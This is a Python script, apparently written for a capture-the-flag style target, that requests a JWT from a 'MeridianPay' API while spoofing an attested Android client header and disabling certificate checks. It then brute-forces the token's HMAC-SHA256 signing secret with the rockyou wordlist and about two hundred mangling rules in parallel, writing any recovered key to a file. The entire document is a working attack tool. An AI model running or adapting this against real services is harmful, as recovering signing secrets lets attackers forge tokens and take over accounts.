import base64, hashlib, hmac, json, os, ssl, urllib.request
from multiprocessing import Pool

BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
r = urllib.request.Request(BASE+"/api/v1/auth/device", data=json.dumps({"device_id":"deep"}).encode(),
                           method="POST", headers={"Content-Type":"application/json","X-Meridian-Client":"MeridianPay-Android/3.2.1 (attested)"})
with urllib.request.urlopen(r, context=CTX, timeout=15) as f:
    TOKEN = json.loads(f.read())["token"]
h0, p0, s0 = TOKEN.split(".")
SIGNING = (h0+"."+p0).encode()
SIG = base64.urlsafe_b64decode(s0+"="*(-len(s0)%4))

A = [bytes([c]) for c in b"0123456789!@#$%&*_-?. "]
B = [x+y for x in A[:12] for y in A[:12]]
SUF = [b"1", b"12", b"123", b"1234", b"12345", b"!", b"?!", b"@1", b"#1", b"01", b"007", b"69", b"00", b"000",
       b"2020", b"2021", b"2022", b"2023", b"2024", b"2025", b"2026", b"2019", b"2018", b"01!", b"_1", b"-1", b"_123", b"-123"]
PRE = [b"", b"1", b"!", b"@", b"the", b"meridian", b"mp", b"pay", b"secret", b"0", b"7"]
SUBS = [(b"a", b"4"), (b"e", b"3"), (b"i", b"1"), (b"o", b"0"), (b"s", b"$"), (b"A", b"4"), (b"E", b"3"),
        (b"t", b"7"), (b"g", b"9"), (b"l", b"1")]
LEET = bytes.maketrans(b"aeiosAEitl", b"4310$33771")


def variants(w):
    yield w
    yield w.upper(); yield w.capitalize(); yield w.title(); yield w.swapcase(); yield w[::-1]
    lv = w.translate(LEET)
    yield lv; yield lv.capitalize(); yield lv.upper()
    yield w+w
    for a in A:
        yield w+a; yield a+w
    for b in B[:60]:
        yield w+b
    for s in SUF:
        yield w+s
    for p in PRE:
        if p: yield p+w
    yield w.capitalize()+b"1"; yield w.capitalize()+b"!"; yield w.upper()+b"1"; yield w.upper()+b"!"
    yield w.title()+b"2026"; yield w[::-1]+b"1"; yield lv+b"1"; yield lv+b"!"
    for x, y in SUBS:
        if x in w:
            yield w.replace(x, y)
            if x.lower() in w:
                yield w.replace(x.lower(), y)


def crack(rng):
    a, b = rng
    new, sha, cd = hmac.new, hashlib.sha256, hmac.compare_digest
    with open("rockyou.txt", "rb") as f:
        f.seek(a)
        if a: f.readline()
        pos = f.tell()
        while pos < b:
            line = f.readline()
            if not line: break
            pos = f.tell()
            w = line.rstrip(b"\r\n")
            if not w: continue
            for k in variants(w):
                if cd(new(k, SIGNING, sha).digest(), SIG):
                    return k
    return None


if __name__ == "__main__":
    N = 14
    SIZE = os.path.getsize("rockyou.txt")
    step = SIZE // N
    jobs = [(i*step, (i+1)*step if i < N-1 else SIZE) for i in range(N)]
    print("deep rule pass over", SIZE, "bytes x ~200 rules", flush=True)
    hit = None
    with Pool(N) as pool:
        for res in pool.imap_unordered(crack, jobs):
            if res:
                hit = res; pool.terminate(); break
    print("DEEP RULE HIT:", hit, flush=True)
    if hit:
        open("jwt_secret.bin", "wb").write(hit)
